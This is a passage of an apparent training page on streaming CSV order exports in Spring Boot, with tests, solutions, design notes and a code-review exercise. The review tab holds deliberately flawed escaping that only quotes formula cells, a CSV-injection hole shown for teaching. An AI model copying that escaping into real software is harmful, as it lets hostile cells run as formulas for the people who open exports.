+}</code></pre></div></details></section><section class="challenge"><p class="eyebrow">Challenge 2 · Go deeper · about 30 minutes</p><h2>Export history</h2><p><code>GET /seller/exports</code>: the seller's own exports, newest first, each with <code>rowsSent</code>. The count is known only when the stream ends, so a V3 migration adds <code>rows_sent</code>, filled in after the last row.</p><p><b>Done when:</b> both tests in <code>ExportHistoryChallengeTest</code> pass.</p><details class="qa"><summary>Hints</summary><ul><li>Keep the log entry's id from the insert and update it after the last row is written.</li><li>An export cut off by the client leaves <code>rows_sent</code> empty: that is information too.</li></ul></details><p class="path">challenge/ExportHistoryChallengeTest.java</p><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+
+import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
+
+/**
+ * Challenge 2: GET /seller/exports lists the seller&#x27;s own exports, newest first, each with the number of orders it
+ * sent. The number is known only when the stream ends: a V3 migration adds rows_sent, filled in after the last row.
+ */
+class ExportHistoryChallengeTest extends ApiTest {
+
+    @Test
+    void aSellerSeesTheirOwnExportsWithHowManyOrdersEachSent() throws Exception {
+        export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;);
+        export(&quot;neha.store&quot;, &quot;2026-06-30&quot;, &quot;2026-06-30&quot;);
+        export(&quot;arun.mart&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;);
+        mvc.perform(get(&quot;/seller/exports&quot;).with(httpBasic(&quot;neha.store&quot;, password(&quot;neha.store&quot;)))).andExpect(status().isOk())
+                .andExpect(jsonPath(&quot;$.length()&quot;).value(2))
+                .andExpect(jsonPath(&quot;$[0].from&quot;).value(&quot;2026-06-30&quot;)).andExpect(jsonPath(&quot;$[0].rowsSent&quot;).value(1))
+                .andExpect(jsonPath(&quot;$[1].rowsSent&quot;).value(5));
+        mvc.perform(get(&quot;/seller/exports&quot;).with(httpBasic(&quot;arun.mart&quot;, password(&quot;arun.mart&quot;)))).andExpect(jsonPath(&quot;$.length()&quot;).value(1));
+    }
+
+    @Test
+    void supportAndStrangersCannotSeeIt() throws Exception {
+        mvc.perform(get(&quot;/seller/exports&quot;).with(httpBasic(&quot;sam.help&quot;, password(&quot;sam.help&quot;)))).andExpect(status().isForbidden());
+        mvc.perform(get(&quot;/seller/exports&quot;)).andExpect(status().isUnauthorized());
+        mvc.perform(get(&quot;/seller/exports&quot;).with(httpBasic(&quot;neha.store&quot;, password(&quot;neha.store&quot;)))).andExpect(content().json(&quot;[]&quot;));
+    }
+}</code></pre><details class="qa solution"><summary>Solution (open after trying)</summary><p class="path">challenge/solution/OrderExport.java</p><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.jdbc.core.simple.JdbcClient;
+import org.springframework.stereotype.Service;
+import org.springframework.transaction.PlatformTransactionManager;
+import org.springframework.transaction.support.TransactionTemplate;
+
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.UncheckedIOException;
+import java.math.BigDecimal;
+import java.nio.charset.StandardCharsets;
+import java.time.LocalDate;
+import java.time.OffsetDateTime;
+import java.time.ZoneId;
+import java.time.format.DateTimeFormatter;
+
+@Service
+class OrderExport {
+
+    static final ZoneId IST = ZoneId.of(&quot;Asia/Kolkata&quot;);
+    static final String HEADER = &quot;order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status&quot;;
+    private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm&quot;);
+
+    private final JdbcClient jdbc;
+    private final TransactionTemplate readOnly;
+
+    OrderExport(JdbcClient jdbc, PlatformTransactionManager transactions) {
+        this.jdbc = jdbc;
+        this.readOnly = new TransactionTemplate(transactions);
+        this.readOnly.setReadOnly(true);
+    }
+
+    /** Recorded before the first byte is sent; the database refuses a range of more than a year from any writer. */
+    long log(long sellerId, LocalDate from, LocalDate to) {
+        return jdbc.sql(&quot;INSERT INTO export_log (seller_id, from_date, to_date) VALUES (?, ?, ?) RETURNING id&quot;).params(sellerId, from, to).query(Long.class).single();
+    }
+
+    java.util.List&lt;ExportController.ExportEntry&gt; history(long sellerId) {
+        return jdbc.sql(&quot;SELECT from_date AS \&quot;from\&quot;, to_date AS \&quot;to\&quot;, exported_at, rows_sent FROM export_log WHERE seller_id = ? ORDER BY id DESC&quot;)
+                .param(sellerId).query(ExportController.ExportEntry.class).list();
+    }
+
+    /**
+     * Writes the seller&#x27;s orders, oldest first, as rows arrive from the database: PostgreSQL hands them over 1,000 at a
+     * time through a cursor (fetch size, in a transaction), and each row is written and forgotten. Memory stays the
+     * same for ten orders or a year of them. The days are IST days.
+     */
+    void write(long logId, long sellerId, LocalDate from, LocalDate to, String status, OutputStream out) throws IOException {
+        int[] rows = {0};
+        BufferedWriter w = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));
+        w.write(&#x27;\uFEFF&#x27;);   // a byte order mark, so Excel reads the file as UTF-8 (Hindi product names)
+        w.write(HEADER);
+        w.write(&quot;\r\n&quot;);
+        try {
+            readOnly.executeWithoutResult(s -&gt; jdbc.sql(&quot;&quot;&quot;
+                            SELECT order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status FROM orders
+                            WHERE seller_id = ? AND placed_at &gt;= ? AND placed_at &lt; ? AND (CAST(? AS text) IS NULL OR status = ?) ORDER BY placed_at, id&quot;&quot;&quot;)
+                    .params(sellerId, start(from), start(to.plusDays(1)), status, status)
+                    .query(rs -&gt; {
+                        try {
+                            w.write(Csv.text(rs.getString(1)) + &quot;,&quot; + rs.getObject(2, OffsetDateTime.class).atZoneSameInstant(IST).format(TIME) + &quot;,&quot;
+                                    + Csv.text(rs.getString(3)) + &quot;,&quot; + rs.getInt(4) + &quot;,&quot; + BigDecimal.valueOf(rs.getLong(5), 2).toPlainString() + &quot;,&quot;
+                                    + Csv.text(rs.getString(6)) + &quot;,&quot; + rs.getString(7) + &quot;\r\n&quot;);
+                            rows[0]++;
+                        } catch (IOException e) {
+                            throw new UncheckedIOException(e);   // the client went away: stop reading
+                        }
+                    }));
+        } catch (UncheckedIOException e) {
+            throw e.getCause();
+        }
+        w.flush();
+        jdbc.sql(&quot;UPDATE export_log SET rows_sent = ? WHERE id = ?&quot;).params(rows[0], logId).update();   // only after the last row
+    }
+
+    private static OffsetDateTime start(LocalDate istDay) {
+        return istDay.atStartOfDay(IST).toOffsetDateTime();
+    }
+}</code></pre></div><p class="path">challenge/solution/ExportController.java</p><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import jakarta.validation.constraints.Pattern;
+import org.springframework.format.annotation.DateTimeFormat;
+import org.springframework.http.ContentDisposition;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.MediaType;
+import org.springframework.http.ProblemDetail;
+import org.springframework.http.ResponseEntity;
+import org.springframework.security.core.Authentication;
+import org.springframework.web.ErrorResponseException;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;
+
+import java.time.LocalDate;
+import java.time.temporal.ChronoUnit;
+import java.util.Map;
+
+@RestController
+class ExportController {
+
+    /** Demo rule: at most 366 days, both ends included. */
+    static final int MAX_DAYS = 366;
+
+    /** Demo sellers: sign-in name to seller id. The seller always comes from the sign-in, never from the request. */
+    static final Map&lt;String, Long&gt; SELLERS = Map.of(&quot;neha.store&quot;, 1L, &quot;arun.mart&quot;, 2L);
+
+    private final OrderExport export;
+
+    ExportController(OrderExport export) {
+        this.export = export;
+    }
+
+    record ExportEntry(LocalDate from, LocalDate to, java.time.OffsetDateTime exportedAt, Integer rowsSent) {
+    }
+
+    /** The seller&#x27;s own exports, newest first; rowsSent is empty while one runs or if it was cut off. */
+    @GetMapping(&quot;/seller/exports&quot;)
+    java.util.List&lt;ExportEntry&gt; exports(Authentication who) {
+        return export.history(SELLERS.get(who.getName()));
+    }
+
+    /** The CSV is written while it is read from the database, so a year of orders never sits in memory. */
+    @GetMapping(&quot;/seller/orders/export&quot;)
+    ResponseEntity&lt;StreamingResponseBody&gt; export(@RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate from,
+                                                 @RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate to,
+                                                 @RequestParam(required = false) @Pattern(regexp = &quot;PLACED|SHIPPED|DELIVERED|CANCELLED&quot;) String status,
+                                                 Authentication who) {
+        if (to.isBefore(from) || ChronoUnit.DAYS.between(from, to) &gt;= MAX_DAYS) {
+            throw new ErrorResponseException(HttpStatus.BAD_REQUEST,
+                    ProblemDetail.forStatusAndDetail(HttpStatus.BAD_REQUEST, &quot;from must be on or before to, and at most a year apart&quot;), null);
+        }
+        long seller = SELLERS.get(who.getName());
+        long logId = export.log(seller, from, to);
+        StreamingResponseBody body = out -&gt; export.write(logId, seller, from, to, status, out);
+        return ResponseEntity.ok()
+                .contentType(new MediaType(&quot;text&quot;, &quot;csv&quot;, java.nio.charset.StandardCharsets.UTF_8))
+                .header(HttpHeaders.CONTENT_DISPOSITION, ContentDisposition.attachment().filename(&quot;orders-&quot; + from + &quot;-to-&quot; + to + &quot;.csv&quot;).build().toString())
+                .body(body);
+    }
+}</code></pre></div><p class="path">challenge/solution/SecurityConfig.java</p><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.context.annotation.Bean;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.http.HttpMethod;
+import org.springframework.security.config.annotation.web.builders.HttpSecurity;
+import org.springframework.security.config.http.SessionCreationPolicy;
+import org.springframework.security.core.userdetails.User;
+import org.springframework.security.crypto.factory.PasswordEncoderFactories;
+import org.springframework.security.crypto.password.PasswordEncoder;
+import org.springframework.security.provisioning.InMemoryUserDetailsManager;
+import org.springframework.security.web.SecurityFilterChain;
+
+@Configuration
+class SecurityConfig {
+
+    @Bean
+    SecurityFilterChain api(HttpSecurity http, ProblemResponses problems) throws Exception {
+        http.authorizeHttpRequests(a -&gt; a
+                        .requestMatchers(HttpMethod.GET, &quot;/seller/orders/export&quot;, &quot;/seller/exports&quot;).hasRole(&quot;SELLER&quot;)
+                        .requestMatchers(&quot;/error&quot;).permitAll()
+                        .anyRequest().denyAll())
+                .httpBasic(b -&gt; b.authenticationEntryPoint(problems::unauthenticated))
+                .exceptionHandling(x -&gt; x.authenticationEntryPoint(problems::unauthenticated).accessDeniedHandler(problems::forbidden))
+                .sessionManagement(s -&gt; s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
+                .csrf(csrf -&gt; csrf.disable());   // credentials in a header with every request, no cookie a browser sends by itself
+        return http.build();
+    }
+
+    @Bean
+    PasswordEncoder passwordEncoder() {
+        return PasswordEncoderFactories.createDelegatingPasswordEncoder();
+    }
+
+    /** Demo users, password &quot;name-demo-pass&quot; (name before the dot). Support may not export buyers&#x27; data. */
+    @Bean
+    InMemoryUserDetailsManager users(PasswordEncoder encoder) {
+        return new InMemoryUserDetailsManager(
+                User.withUsername(&quot;neha.store&quot;).password(encoder.encode(&quot;neha-demo-pass&quot;)).roles(&quot;SELLER&quot;).build(),
+                User.withUsername(&quot;arun.mart&quot;).password(encoder.encode(&quot;arun-demo-pass&quot;)).roles(&quot;SELLER&quot;).build(),
+                User.withUsername(&quot;sam.help&quot;).password(encoder.encode(&quot;sam-demo-pass&quot;)).roles(&quot;SUPPORT&quot;).build());
+    }
+}</code></pre></div><p class="path">challenge/solution/V3__rows_sent.sql</p><div class="src"><pre class="code"><code class="language-sql">-- How many orders an export sent, filled in when its last row is written (empty while it runs, or if it was cut off).
+ALTER TABLE export_log ADD COLUMN rows_sent integer;
+ALTER TABLE export_log ADD CONSTRAINT export_log_rows_sent CHECK (rows_sent &gt;= 0);</code></pre></div></details></section>
+<section class="challenge"><p class="eyebrow">Challenge 3 · design on paper, no code</p>
+<h2>Exports as jobs</h2>
+<p>A seller with five million orders a year asks for an export. Even streamed, the request runs for minutes, through load balancers that cut it at 60 seconds. Design it as a job: <code>202</code> with a job id, the file written to object storage, a time-limited download link, and an email when ready. What still streams, and where?</p>
+</section>
+</section><section role="tabpanel" id="panel-design" aria-labelledby="tab-design" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>8. Implementation approach</li><li>9. Design alternatives and trade-offs</li><li>12. Database design: tables, constraints, transaction boundary</li></ul><p class="rule">The learner decides the design here, before opening the Code tab.</p></aside>
+<h2>Implementation approach</h2>
+<ol class="steps">
+<li>Write the trap test: the old list-and-join way.</li>
+<li>Write <code>Csv.text</code> with its rules and tests.</li>
+<li>Stream: <code>StreamingResponseBody</code>, a read-only transaction, a fetch size, a writer per row.</li>
+<li>Prove it with a test that fails when rows are loaded first; then lock down who may export what.</li>
+</ol>
+<h2>Design alternatives and trade-offs</h2>
+<div class="scroll"><table class=""><thead><tr><th>Approach</th><th>What it costs</th><th>Verdict</th></tr></thead><tbody><tr><td>Stream rows from a cursor to the response</td><td>The connection is held while the file downloads.</td><td><span class="pill ok">Chosen</span></td></tr><tr><td>Load all rows, build the file, send it</td><td>Memory grows with the export; nothing is sent until the end.</td><td><span class="pill bad">The trap</span></td></tr><tr><td>Quote formula cells</td><td>Quotes are CSV syntax; the formula still runs.</td><td><span class="pill bad">Review finding</span></td></tr><tr><td>Page through with LIMIT/OFFSET</td><td>Many queries; later pages get slower; rows can move between pages.</td><td><span class="pill warn">Worse than a cursor</span></td></tr><tr><td>A background job to object storage</td><td>More parts; no time limit on the request.</td><td><span class="pill warn">For huge exports</span></td></tr></tbody></table></div>
+<h2>Database design</h2>
+<div class="scroll"><table class=""><thead><tr><th>Object</th><th>What</th><th>Why</th></tr></thead><tbody><tr><td><code>orders_seller_time</code></td><td>Index (seller, placed_at)</td><td>The export reads one seller's range in time order.</td></tr><tr><td><code>export_log_range</code></td><td>CHECK</td><td>At most 366 days, in the right order, for any writer.</td></tr><tr><td><code>orders_ref_once_per_seller</code></td><td>UNIQUE</td><td>One order ref per seller.</td></tr><tr><td><code>orders_quantity_positive</code>, <code>orders_amount_positive</code>, <code>orders_status</code></td><td>CHECKs</td><td>Rows an export can trust.</td></tr></tbody></table></div>
+<p><strong>Transaction boundaries:</strong> the log entry is committed first. The rows are read in one read-only transaction, open for as long as the file takes to write.</p>
+<pre class="code"><code class="language-sql">CREATE TABLE orders (
+    id           bigint GENERATED ALWAYS AS IDENTITY CONSTRAINT orders_pk PRIMARY KEY,
+    seller_id    bigint NOT NULL,
+    order_ref    text NOT NULL,
+    placed_at    timestamptz NOT NULL,
+    product_name text NOT NULL,
+    quantity     integer NOT NULL,
+    amount_paise bigint NOT NULL,
+    buyer_city   text NOT NULL,
+    status       text NOT NULL,
+    CONSTRAINT orders_ref_once_per_seller UNIQUE (seller_id, order_ref),
+    CONSTRAINT orders_quantity_positive CHECK (quantity &gt; 0),
+    CONSTRAINT orders_amount_positive CHECK (amount_paise &gt; 0),
+    CONSTRAINT orders_status CHECK (status IN (&#x27;PLACED&#x27;, &#x27;SHIPPED&#x27;, &#x27;DELIVERED&#x27;, &#x27;CANCELLED&#x27;))
+);
+CREATE INDEX orders_seller_time ON orders (seller_id, placed_at);
+
+-- Every export of buyers&#x27; data is recorded before it starts: who, which days, when.
+CREATE TABLE export_log (
+    id          bigint GENERATED ALWAYS AS IDENTITY CONSTRAINT export_log_pk PRIMARY KEY,
+    seller_id   bigint NOT NULL,
+    from_date   date NOT NULL,
+    to_date     date NOT NULL,
+    exported_at timestamptz NOT NULL DEFAULT now(),
+    -- Demo rule: at most a year per export, 366 days with both ends included.
+    CONSTRAINT export_log_range CHECK (to_date &gt;= from_date AND to_date - from_date &lt; 366)
+);</code></pre></section><section role="tabpanel" id="panel-production" aria-labelledby="tab-production" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>15. Real-world considerations</li><li>14. Operations (Production Scale stations only)</li></ul><p class="rule">A Working Systems station: the considerations to know, no runbook.</p></aside>
+<dl class="facts">
+<dt>Connections</dt><dd>A streaming export holds a database connection until the download ends; a slow client holds it longer. Limit concurrent exports per seller and size the pool for them.</dd>
+<dt>Time limits</dt><dd>Load balancers and proxies cut long responses (60 seconds is common). Beyond that, use a job (challenge 3).</dd>
+<dt>Personal data</dt><dd>Exports carry buyers' data out of your systems: log them, limit them, and keep columns to what the seller needs.</dd>
+<dt>Async requests</dt><dd><code>StreamingResponseBody</code> runs on another thread; set <code>spring.mvc.async.request-timeout</code> to something an export can finish in.</dd>
+</dl>
+</section><section role="tabpanel" id="panel-interview" aria-labelledby="tab-interview" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>16. Interview takeaways</li><li>17. Self-check rubric</li></ul><p class="rule">Answers are hidden until opened, so the learner tries first.</p></aside>
+<h2>Interview takeaways</h2>
+<details class="qa"><summary>How do you export a million rows without running out of memory?</summary><p>Stream: write the response while reading rows from a database cursor, a few thousand at a time, keeping nothing.</p></details><details class="qa"><summary>What does PostgreSQL&#x27;s JDBC driver need to stream rows?</summary><p>A fetch size and a transaction (autocommit off). Otherwise it reads the whole result before returning the first row.</p></details><details class="qa"><summary>What is CSV injection?</summary><p>Text that a spreadsheet runs as a formula because it starts with =, +, - or @. Prefix such cells with an apostrophe.</p></details><details class="qa"><summary>Isn&#x27;t quoting the cell enough?</summary><p>No: quotes are part of CSV, not of the cell. The spreadsheet removes them and runs the formula.</p></details><details class="qa"><summary>How do you test that a response streams?</summary><p>Make the data big enough that loading it takes seconds, and check that the first lines arrive long before that.</p></details>
+<h2>Self-check rubric</h2>
+<div class="scroll"><table class=""><thead><tr><th>Area</th><th>Meets the bar</th><th>Above the bar</th></tr></thead><tbody><tr><td>Correctness</td><td>All 12 tests pass.</td><td>You ran the flawed version and explained each failure.</td></tr><tr><td>Streaming</td><td>StreamingResponseBody.</td><td>Rows streamed from the database too, proven by a test.</td></tr><tr><td>Cells</td><td>Commas and quotes handled.</td><td>Formula characters neutralised, and you can explain why quoting is not enough.</td></tr><tr><td>Access</td><td>Sellers only.</td><td>The seller from the sign-in, exports logged.</td></tr></tbody></table></div></section><section role="tabpanel" id="panel-review" aria-labelledby="tab-review" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>18. Reviewer view: a flawed version to find and fix, with the reasoning</li></ul><p class="rule">Real code review practice. The flawed version is run against the same tests, and the real failures are shown.</p></aside>
+<h2>The pull request</h2>
+<p>A teammate simplifies the export: rows are read into a list first, "so the connection goes back to the pool sooner", and the escaping becomes one rule: quote any cell with a comma, a quote, a line break, or a leading =. Read both files and list every problem before opening the findings.</p>
+<p class="path">review/OrderExport.java</p>
+<pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.jdbc.core.simple.JdbcClient;
+import org.springframework.stereotype.Service;
+import org.springframework.transaction.PlatformTransactionManager;
+import org.springframework.transaction.support.TransactionTemplate;
+
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.UncheckedIOException;
+import java.math.BigDecimal;
+import java.nio.charset.StandardCharsets;
+import java.time.LocalDate;
+import java.time.OffsetDateTime;
+import java.time.ZoneId;
+import java.time.format.DateTimeFormatter;
+import java.util.List;
+
+@Service
+class OrderExport {
+
+    static final ZoneId IST = ZoneId.of(&quot;Asia/Kolkata&quot;);
+    static final String HEADER = &quot;order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status&quot;;
+    private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm&quot;);
+
+    private final JdbcClient jdbc;
+    private final TransactionTemplate readOnly;
+
+    OrderExport(JdbcClient jdbc, PlatformTransactionManager transactions) {
+        this.jdbc = jdbc;
+        this.readOnly = new TransactionTemplate(transactions);
+        this.readOnly.setReadOnly(true);
+    }
+
+    /** Recorded before the first byte is sent; the database refuses a range of more than a year from any writer. */
+    void log(long sellerId, LocalDate from, LocalDate to) {
+        jdbc.sql(&quot;INSERT INTO export_log (seller_id, from_date, to_date) VALUES (?, ?, ?)&quot;).params(sellerId, from, to).update();
+    }
+
+    /**
+     * Writes the seller&#x27;s orders, oldest first, as rows arrive from the database: PostgreSQL hands them over 1,000 at a
+     * time through a cursor (fetch size, in a transaction), and each row is written and forgotten. Memory stays the
+     * same for ten orders or a year of them. The days are IST days.
+     */
+    void write(long sellerId, LocalDate from, LocalDate to, OutputStream out) throws IOException {
+        BufferedWriter w = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));
+        w.write(&#x27;\uFEFF&#x27;);   // a byte order mark, so Excel reads the file as UTF-8 (Hindi product names)
+        w.write(HEADER);
+        w.write(&quot;\r\n&quot;);
+        // Read the rows first, then write: the connection goes back to the pool sooner, and the code is simpler.
+        record Row(String ref, OffsetDateTime at, String product, int quantity, long paise, String city, String status) {
+        }
+        List&lt;Row&gt; rows = jdbc.sql(&quot;&quot;&quot;
+                        SELECT order_ref AS ref, placed_at AS at, product_name AS product, quantity, amount_paise AS paise, buyer_city AS city, status FROM orders
+                        WHERE seller_id = ? AND placed_at &gt;= ? AND placed_at &lt; ? ORDER BY placed_at, id&quot;&quot;&quot;)
+                .params(sellerId, start(from), start(to.plusDays(1))).query(Row.class).list();
+        for (Row r : rows) {
+            w.write(Csv.text(r.ref()) + &quot;,&quot; + r.at().atZoneSameInstant(IST).format(TIME) + &quot;,&quot; + Csv.text(r.product()) + &quot;,&quot; + r.quantity() + &quot;,&quot;
+                    + BigDecimal.valueOf(r.paise(), 2).toPlainString() + &quot;,&quot; + Csv.text(r.city()) + &quot;,&quot; + r.status() + &quot;\r\n&quot;);
+        }
+        w.flush();
+    }
+
+    private static OffsetDateTime start(LocalDate istDay) {
+        return istDay.atStartOfDay(IST).toOffsetDateTime();
+    }
+}</code></pre>
+<p class="path">review/Csv.java</p>
+<pre class="code"><code class="language-java">package com.kartwala.export;
+
+/** One CSV cell, safe for spreadsheets. */
+final class Csv {
+
+    private Csv() {
+    }
+
+    /** RFC 4180 quoting; a cell that starts with = is quoted as well, so a spreadsheet keeps it as text. */
+    static String text(String value) {
+        if (value.startsWith(&quot;=&quot;) || value.contains(&quot;,&quot;) || value.contains(&quot;\&quot;&quot;) || value.contains(&quot;\n&quot;) || value.contains(&quot;\r&quot;)) {
+            return &quot;\&quot;&quot; + value.replace(&quot;\&quot;&quot;, &quot;\&quot;\&quot;&quot;) + &quot;\&quot;&quot;;
+        }
+        return value;
+    }
+}</code></pre>
+<h2>Findings</h2>
+<details class="finding"><summary><span class="sev">1</span>Rows loaded into a list before writing</summary><p>"The connection goes back to the pool sooner": and a year of orders sits in memory before the first byte is sent. The export works until a big seller uses it.</p><p class="evidence"><b>Test evidence:</b> <code>theFirstLinesArriveLongBeforeAllRowsCouldHaveBeenRead</code> fails.</p></details><details class="finding"><summary><span class="sev">2</span>Formula cells only quoted</summary><p>"Quoted, so the spreadsheet keeps it as text": quotes belong to CSV, not to the cell. The spreadsheet removes them and runs <code>=HYPERLINK(...)</code>. And + - @ are not handled at all.</p><p class="evidence"><b>Test evidence:</b> <code>theApiNeutralisesFormulasAndQuotesCells</code>, <code>cellsAreEscapedTheSpreadsheetWay</code> and <code>aYearOfOrdersAsAnAttachmentInIstDaysOldestFirst</code> fail.</p></details>
+<h2>Same tests, flawed version</h2>
+<p class="muted">From <code>docs/review-run.txt</code>: the flawed files copied over the real ones, then the full suite run.</p>
+<div class="scroll"><table class=""><thead><tr><th>Test class</th><th>Fixed version</th><th>Flawed version</th></tr></thead><tbody><tr><td><code>ExportDatabaseTest</code></td><td><span class="pill ok">2 / 2</span></td><td><span class="pill ok">2 / 2</span></td></tr><tr><td><code>ExportSecurityTest</code></td><td><span class="pill ok">3 / 3</span></td><td><span class="pill ok">3 / 3</span></td></tr><tr><td><code>ExportContractTest</code></td><td><span class="pill ok">4 / 4</span></td><td><span class="pill bad">2 / 4</span></td></tr><tr><td><code>FormulaAndMemoryTrapTest</code></td><td><span class="pill ok">2 / 2</span></td><td><span class="pill bad">1 / 2</span></td></tr><tr><td><code>StreamingExportTest</code></td><td><span class="pill ok">1 / 1</span></td><td><span class="pill bad">0 / 1</span></td></tr></tbody></table></div>
+<p class="note">With six orders and no attacker, the flawed export is correct. Its problems need a big seller and a hostile product name: both normal on a marketplace.</p>
+</section></main>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+(function () {
+  var tabs = Array.prototype.slice.call(document.querySelectorAll('.tabs [role="tab"]'));
+
+  function show(key, focus) {
+    var found = tabs.some(function (t) { return t.dataset.tab === key; });
+    if (!found) key = tabs[0].dataset.tab;
+    tabs.forEach(function (t) {
+      var on = t.dataset.tab === key;
+      t.setAttribute('aria-selected', on ? 'true' : 'false');
+      t.tabIndex = on ? 0 : -1;
+      document.getElementById('panel-' + t.dataset.tab).hidden = !on;
+      if (on && focus) t.focus();
+      if (on) { // keep the active tab visible in the strip without scrolling the page
+        var strip = t.parentNode;
+        if (t.offsetLeft < strip.scrollLeft || t.offsetLeft + t.offsetWidth > strip.scrollLeft + strip.clientWidth) {
+          strip.scrollLeft = t.offsetLeft - 16;
+        }
+      }
+    });
+    if (location.hash.slice(1) !== key) history.replaceState(null, '', '#' + key);
+  }
+
+  tabs.forEach(function (t, i) {
+    t.addEventListener('click', function () { show(t.dataset.tab); });
+    t.addEventListener('keydown', function (ev) {
+      var d = ev.key === 'ArrowRight' ? 1 : ev.key === 'ArrowLeft' ? -1 : 0;
+      if (!d) return;
+      ev.preventDefault();
+      show(tabs[(i + d + tabs.length) % tabs.length].dataset.tab, true);
+    });
+  });
+
+  document.addEventListener('click', function (ev) {
+    var link = ev.target.closest('[data-goto]');
+    if (!link) return;
+    ev.preventDefault();
+    show(link.dataset.goto);
+    document.querySelector('.tabbar').scrollIntoView({ block: 'start' });
+  });
+
+  // File browsers inside the Code and Tests tabs
+  document.querySelectorAll('.file-btn').forEach(function (b) {
+    b.addEventListener('click', function () {
+      var group = b.dataset.group;
+      document.querySelectorAll('.file-btn[data-group="' + group + '"]').forEach(function (o) {
+        var on = o === b;
+        o.setAttribute('aria-selected', on ? 'true' : 'false');
+        document.getElementById(o.getAttribute('aria-controls')).hidden = !on;
+      });
+    });
+  });
+
+  show(location.hash.slice(1) || 'problem');
+  window.addEventListener('hashchange', function () { show(location.hash.slice(1)); });
+
+  if (window.hljs) {
+    document.querySelectorAll('pre.code code').forEach(function (el) { window.hljs.highlightElement(el); });
+  }
+})();
+</script>
